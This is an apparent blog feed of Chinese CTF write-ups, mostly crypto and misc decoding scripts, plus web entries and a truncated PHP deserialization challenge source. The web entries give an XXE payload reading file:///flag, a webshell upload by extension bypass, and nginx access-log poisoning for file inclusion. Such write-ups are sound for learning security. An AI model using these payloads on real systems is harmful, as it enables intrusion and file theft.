class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_decrypt</span>(<span class="params">text, shift</span>):</span><br><span class="line">    decrypted_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">or</span> char == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            decrypted_text += char</span><br><span class="line">        <span class="keyword">elif</span> char.isalpha():</span><br><span class="line">            offset = <span class="number">65</span> <span class="keyword">if</span> char.isupper() <span class="keyword">else</span> <span class="number">97</span></span><br><span class="line">            decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - offset - shift) % <span class="number">26</span> + offset)</span><br><span class="line">            decrypted_text += decrypted_char</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            decrypted_text += char</span><br><span class="line">    <span class="keyword">return</span> decrypted_text</span><br><span class="line">cipher_text = <span class="string">&quot;kqfl&#123;O7p3iQ9rS6uV8W2X&#125;&quot;</span></span><br><span class="line">shift = <span class="number">5</span></span><br><span class="line">plain_text = caesar_decrypt(cipher_text, shift)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;解密后的文本: <span class="subst">&#123;plain_text&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>3.找到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234603756-c3b5c4b1-a83f-4070-80b4-918481cd9872.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Crypto-easy-签到题"><a href="#Crypto-easy-签到题" class="headerlink" title="Crypto easy-签到题"></a>Crypto easy-签到题</h2><p>一、题目截图</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234590627-dd7ca80e-cac2-4183-acf2-bf00c0ac941f.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234590939-1ce0a757-9eb5-4ae4-85d0-792d9cc6d105.png"></p><p>二、解题思路（要求解题思路清晰,每个题需截图flag值并且包含时间）</p><p>1.获取到解题文件</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234591238-59eb681b-321d-48c1-af18-6439e76bdc9e.png"></p><p>2.然后利用Detect It Easy工具发现这个是文本格式</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234591518-69b85994-338a-41ce-98a5-5d9653e06aa2.png"></p><p>3.发现这个编码像base64</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234591781-65d0d9dc-6376-45ce-9f44-08d6029636ff.png"></p><p>4.cyberchef进行解码</p><p>base64解码</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234592053-8d53d7b0-dd72-4caa-9b41-7103d200da67.png"></p><p>再base32解码</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234592321-a9f2464b-5358-4bef-b776-24f3dead6821.png"></p><p>发现是一串神奇的数字,很像16进制字符串,再进行16进制解码就行了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234592570-22636e64-6ca0-4bd3-974b-a64e57f30fe7.png"></p><h2 id="Misc-ez-xor"><a href="#Misc-ez-xor" class="headerlink" title="Misc ez_xor"></a>Misc ez_xor</h2><p>一、题目截图</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234604156-f0e56a79-8b3f-49fc-9ec0-8c2ca2816c69.png"></p><ol><li>解题思路</li></ol><p>1.看文件内容</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234604466-f47831f8-0298-42b6-a0e1-f69b92a3aa61.png"></p><p>2、写解密代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x5f</span>, <span class="number">0x55</span>, <span class="number">0x58</span>, <span class="number">0x5e</span>, <span class="number">0x42</span>, <span class="number">0x71</span>, <span class="number">0x7a</span>, <span class="number">0x6d</span>,</span><br><span class="line">        <span class="number">0x7f</span>, <span class="number">0x48</span>, <span class="number">0x4e</span>, <span class="number">0x5c</span>, <span class="number">0x78</span>, <span class="number">0x6a</span>, <span class="number">0x7d</span>, <span class="number">0x08</span>,</span><br><span class="line">        <span class="number">0x0a</span>, <span class="number">0x0e</span>, <span class="number">0x44</span>]</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b ^ key) <span class="keyword">for</span> b <span class="keyword">in</span> data)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">32</span> &lt;= <span class="built_in">ord</span>(c) &lt;= <span class="number">126</span> <span class="keyword">for</span> c <span class="keyword">in</span> result):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Key = <span class="subst">&#123;key&#125;</span>,<span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>3.得到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234604970-f9f0d871-e564-4d12-a639-fb6f127018a5.png"></p><h2 id="cry-rsa"><a href="#cry-rsa" class="headerlink" title="cry_rsa"></a>cry_rsa</h2><p>一、题目截图</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234605381-93a8135d-dc3d-4c85-b8a1-60aae0ad9658.png"></p><ol><li>解题思路</li></ol><p>1.分析题目</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234605637-04e198c8-fd4f-4dda-a02a-8a9b81db0206.png">2.写解密函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    gcd, x1, y1 = extended_gcd(b, a % b)</span><br><span class="line">    x = y1</span><br><span class="line">    y = x1 - (a // b) * y1</span><br><span class="line">    <span class="keyword">return</span> gcd, x, y</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inverse</span>(<span class="params">e, phi_n</span>):</span><br><span class="line">    gcd, x, y = extended_gcd(e, phi_n)</span><br><span class="line">    <span class="keyword">if</span> gcd != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;e 和 φ(n) 不互质,无法求模逆&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> x % phi_n</span><br><span class="line">p = <span class="number">473398607161</span></span><br><span class="line">q = <span class="number">4511491</span></span><br><span class="line">e = <span class="number">19</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = mod_inverse(e, phi_n)</span><br><span class="line">flag = d + <span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;d = <span class="subst">&#123;d&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li>得到flag</li></ol><p>flag:flag{2023326077889096383}</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234606117-98c78d87-b5ac-49fc-ad05-65fdd26acadd.png"></p><h2 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h2><p>一、题目截图</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234606447-6d18c3cc-8d5d-4e15-973a-e6d071ba473c.png"></p><p>二、解题思路</p><p>题目说 1&#x2F;4的礼物是1 - 1&#x2F;3 + 1&#x2F;5 - 1&#x2F;7 + …</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234606750-f66cd1f5-2736-4da8-ae43-ccffc0137614.png"></p><p>这1 - 1&#x2F;3 + 1&#x2F;5 - 1&#x2F;7 + … 明显是π&#x2F;4,再乘4就是π,签到题</p><p>flag{pie},偏移量为2,所以flag为flag{rkg},不用工具,心算凯撒就行</p><p>3.解出flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234606989-cc201cd3-421a-43b6-b106-8d08726f0f8f.png"></p>]]></content>
      
      
      <categories>
          
          <category> 2025CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Compete </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十六届蓝桥杯CTF</title>
      <link href="/2025/04/26/2025CTF/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup/"/>
      <url>/2025/04/26/2025CTF/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>写出了5道基础的签到题,基本上是有省奖了,但是web的黑客的那道题真的不会python,看不懂加密函数,解密方法就不知道了,真的该好好学python了。</p><h1 id="解题情况"><a href="#解题情况" class="headerlink" title="解题情况"></a>解题情况</h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745768487350-b3fd3c21-fdb2-4de1-a7d9-f43ef1da86b3.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766796913-3903ade8-15a4-4498-891d-2b5a68cb7b35.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766797220-2486e1d6-b145-4ebc-a0a7-2d97db74d3fe.png"></p><h1 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h1><p>工具：CyberChef</p><p>看题目可以知道这是Enima进行加密</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766797478-d5c70722-90da-40d1-9b65-c77edb6f4fef.png"></p><p>所以我们反过来,打开CyberChef,选择Enigma,把刚才题目的密文复制进去,得到的是可读的字符串,flag包裹一下去除空格就可以了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766797714-352f1730-0e6c-41ba-8ff5-002a92aa6d2f.png"></p><p>flag：flag{HELLOCTFERTHISISAMESSAGEFORYOU}</p><h1 id="星际xml解释器"><a href="#星际xml解释器" class="headerlink" title="星际xml解释器"></a>星际xml解释器</h1><p>很简单的xml,直接用通用playload就行了,甚至&#x2F;flag都不用改,甚至username,password都不用改。直接file伪协议读取根目录下的flag即&#x2F;flag就行</p><p>Playload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY test SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766798032-b6b3984c-3a45-4ea7-a2b9-0cbef842205a.png"></p><p>flag：flag{78f6ec92-9da9-4cb5-8be9-8fed6f46b931}</p><h1 id="ezEvtx"><a href="#ezEvtx" class="headerlink" title="ezEvtx"></a>ezEvtx</h1><p>把附件下载之后打开,对事件筛选一下,排除干扰的选项就行了</p><p>干扰事件选项为7036,4624,4688,4634。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766798363-2404f2b8-59be-40c1-a77a-098a22c34185.png"></p><p>右上角筛选,把几个事件级别都勾选上,然后把这几个-7036,-4624,-4688,-4634,填上去注意要加负号代表剔除,然后就发现只有一个</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766798655-559e9370-f285-47ba-90c2-2dd3c4efe26b.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766798973-fe818bb7-303e-4cdd-82e4-7710e730257d.png"></p><p>flag：flag{confidential.docx}</p><h1 id="Flowzip"><a href="#Flowzip" class="headerlink" title="Flowzip"></a>Flowzip</h1><p>工具：Wireshark</p><p>这一题真的有点废时间,我一开始从头看到尾都没有结果,甚至随便找了给压缩包就尝试解压,发现不行,有看一下这个是个比较简单的题目,应该直接找就行了,观察length不同的就行了,真的需要耐心。结果是202的不一样,位置在第46个压缩包,其他的都是196和260等干扰选项。然后用追踪流http打开这个就行了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766799311-6cea7fd8-d463-4e4d-ad62-1332d943292a.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766799606-25fa3a34-fed9-4b49-97e2-bfee687f1a44.png"></p><p>flag：flag{c6db63e6-6459-4e75-bb37-3aec5d2b947b}</p><h1 id="ShadowPhases"><a href="#ShadowPhases" class="headerlink" title="ShadowPhases"></a>ShadowPhases</h1><p>工具：ida</p><p>这道re题动态调试一下直接出来了也没有什么反调试函数,真的很简单。动态调试有个很好的作用,直接可以绕过繁琐的加密函数和头大的字符,直接看到结果,这样我们就不用对前面的繁琐的加密代码进行分析了</p><p>断点下在scanf上,因为之后就是进行检测你的输入比较flag了</p><p>printf(&amp;Format);</p><p><font style="color:#D83931;"> scanf(“%127s”, Str1);</font></p><p>  if ( !strcmp(Str1, Str2) )</p><p>puts(&amp;byte_40502A);</p><p>&amp;Format是什么呢？动态调试一下应该是这个</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766799822-85546417-3ced-4902-b951-d547ea8770e3.png"></p><p>这样就更加证明了断点加在scanf是合适的</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766800048-6558e315-7134-474f-8f70-cea5bf4c497c.png"></p><p>因为之后是对Str1和Str2进行比较,所以分别看看Str1和Str2就行了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766800235-881406a8-66fd-4179-9539-15772beb50cd.png"></p><p>flag在Str2里,显而易见</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766800444-e4130cbf-a0b1-495e-9737-df6ab0bd72fc.png"></p><table><thead><tr><th align="left">之后再左上角点击Edit进行导出就可以直接看到flag了</th><th></th></tr></thead></table><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766800701-527059ef-3ebf-464b-beba-60dead23c27a.png"></p><p>记得要选择string literal,直接就能看到flag,可以直接复制</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766800955-99ea7e65-5b47-4408-8892-fbd0ef64b20d.png"></p><p>flag：flag{0fa830e7-b699-4513-8e01-51f35b0f3293}</p><h1 id="黑客密室逃脱（未解出-只差解密的一步）"><a href="#黑客密室逃脱（未解出-只差解密的一步）" class="headerlink" title="黑客密室逃脱（未解出,只差解密的一步）"></a>黑客密室逃脱（未解出,只差解密的一步）</h1><p>题目页面</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766801278-9ecfac5d-c09f-48d2-91ce-686f04666d54.png"></p><p>访问一下这个日志文件,要获取的应该就是加密的flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766801655-9c4ecef0-4b43-4667-a57a-79dab7c50801.png"></p><p>这个提示输入file?name&#x3D;xxx访问文件</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766802009-46b87dd1-6720-4c47-94ad-5fcd745e28b8.png"></p><p>根目录的文件试了几个都不行</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766802378-41395aa1-8337-4afa-a98f-7a7d1da64c10.png"></p><p>所以就尝试app.py,代码就出来了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766802725-5580bc3b-887d-457c-b074-476274a3a36d.png"></p><p>关键的几个代码如图</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766803192-98ebd975-5991-4e10-a854-dcdd17919bda.png"></p><p>发现了hidden.txt</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766803487-f42642f4-cc6e-4503-a24e-96ae19fd28e8.png"></p><p>用file?name&#x3D;hidden.txt访问一下</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766803763-948a8193-d9ad-4095-a6e5-ca4cdb45b2c4.png"></p><p>密钥就有了,在加上加密函数已知,密文已知,就可以推导出加密的flag是什么了,但是这个加密函数我看不懂,在平时就直接搜了,但是考试就没办法了,所以这一题就寄了。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1745766804070-ca5543ec-49ac-4040-ba25-c8e0e32aa0f1.png"></p><p><strong><font style="color:#646A73;"></font></strong></p>]]></content>
      
      
      <categories>
          
          <category> 2025CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Compete </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025sqCTFwp</title>
      <link href="/2025/04/04/2025CTF/sqCTFwp/"/>
      <url>/2025/04/04/2025CTF/sqCTFwp/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="ezGame"><a href="#ezGame" class="headerlink" title="ezGame"></a>ezGame</h2><p>签到题,看源代码</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123328678-8f11c66d-041e-48c9-b22e-13f341bbc982.png"></p><p>找到flag.php,get传入score&#x3D;2048就行</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123328956-93d4766f-1b4f-4d25-84b9-0a6605aa22b3.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123329171-27ef31b3-a414-4693-9390-df34efc8eebc.png"></p><h2 id="是兄弟就来传🐎"><a href="#是兄弟就来传🐎" class="headerlink" title="是兄弟就来传🐎"></a>是兄弟就来传🐎</h2><p>一句话木马上传,cmd.php包不行的</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123329371-eeb9650e-a685-47e2-8ed5-29dcf5edda8d.png"></p><p>.jpg就行</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123329545-18eb3489-3d5d-4367-91fe-fd1a6f5e7199.png"></p><p>抓包改成.php</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123329738-3a78658f-3d8b-48e7-a01e-ed46ef870c42.png"></p><p>蚁剑连接</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123329966-98f7aac0-d881-4701-88dc-5f6f8e8e85ba.png"></p><p>根目录flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123330201-a1a06b02-6339-4888-ab00-ef010d3b3bf1.png"></p><h2 id="My-Blog"><a href="#My-Blog" class="headerlink" title="My Blog"></a>My Blog</h2><p>随便看看网页</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123330448-4d78050f-8d57-48f6-80f1-4a51f9650c58.png"></p><p>用户名密码记下来</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123330674-5f04d4bb-286d-46d7-b572-a95f04073609.png"></p><p>扫目录</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123330953-ef8dc706-e5f1-4310-a764-39b1ac2bd65b.png"></p><p>flag点击就送</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123331269-676f1e14-acd1-4abd-a75b-b5cb483d7712.png"></p><h2 id="商师一日游"><a href="#商师一日游" class="headerlink" title="商师一日游"></a>商师一日游</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123332003-456cec67-19e0-40b5-bce5-895b6a154398.png"></p><p>第一关,F12大法</p><p>碎片收集：sqctf{</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123332395-b137086b-13ba-48e3-b38f-8251372aea94.png"></p><p>第二关,改cookie</p><p>碎片收集：sqctf{82ca</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123332699-3792743c-d135-488a-87ce-171f51b96bde.png"></p><p>第三关,找到你了</p><p>碎片收集：sqctf{82ca34867a</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123333004-d61f7b54-de41-4b7c-b9e3-e51f4d76ffde.png"></p><p>第四关,找robots.txt</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123333556-f2c69df0-137b-4900-885c-b910cdee480b.png"></p><p>碎片收集：sqctf{82ca34867ac54fdab</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123333860-06507a0b-fd37-448a-9361-3ed74fb15803.png"></p><p>第五关,php代码绕过</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123334337-bd030b51-a1ce-4eb5-a0b8-baf11f5276ac.png"></p><p>碎片收集：sqctf{82ca34867ac54fdab779b0db0</p><p>第六关,删除disabled</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123334788-b0daf2ba-89df-44a1-aad5-bc88b20029cc.png"></p><p>碎片收集：sqctf{82ca34867ac54fdab779b0db01e553</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123335193-ecfc4944-8816-4c10-b0ef-0d95527ca7f3.png"></p><p>进入最后一关</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123335561-e4c1aa37-1f44-498d-b0e0-86e0623c926a.png"></p><p>碎片收集sqctf{82ca34867ac54fdab779b0db01e55315}</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123335925-56cca553-9589-4d9c-902f-e7fbfc58dd64.png"></p><h2 id="eeaassyy"><a href="#eeaassyy" class="headerlink" title="eeaassyy"></a>eeaassyy</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123336251-e2245273-5259-4f61-8c5e-726c58a42831.png"></p><p><strong>逃</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123336606-f2795f64-d4b4-4caf-9fd0-8322917d72b2.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123336948-b6aac733-d7ff-4912-85a2-b23de3e335b6.png"></p><h2 id="baby-include"><a href="#baby-include" class="headerlink" title="baby include"></a>baby include</h2><p>有点蒙</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123337180-e458371b-f661-40c2-92c9-009c0f8308fd.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123337412-b353dc5f-c67c-4178-951d-f3f6763e790e.png"></p><p>根据大佬指点看文章：<a href="https://blog.csdn.net/Myon5/article/details/133675614"><font style="color:#3370FF;">文件包含&amp;日志注入</font></a></p><p>日志包含漏洞的成因还是服务器没有进行严格的过滤 ,导致用户可以进行任意文件读取,</p><p>但是前提是服务器需要开启了记录日志的功能才可以利用这个漏洞。</p><p>对于Apache,日志存放路径：&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p><p>对于Ngnix,日志存放路径：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 和 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p><p>测试&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log,成功</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123337707-bcce0385-70de-40c9-a3fc-601676efb6db.png"></p><p>传个🐎</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123338085-f8aaa251-b437-4571-8f9f-2acf00b7d473.png"></p><p>蚁剑连接<br><a href="http://challenge.qsnctf.com:31930/?look=/var/log/nginx/access.log,">http://challenge.qsnctf.com:31930/?look=/var/log/nginx/access.log,</a></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123338349-b1cc5280-e3bf-43ea-9970-e0fbc491960d.png"></p><h2 id="嘿嘿嘿"><a href="#嘿嘿嘿" class="headerlink" title="嘿嘿嘿"></a>嘿嘿嘿</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hhh</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$content</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file &amp;&amp; <span class="variable language_">$this</span>-&gt;content) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;file, <span class="string">&#x27;flag&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;No flag file!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;file)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;File already exists!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;file, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xxx</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yyy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$allowed</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$allowed</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;path = <span class="variable">$path</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;allowed = <span 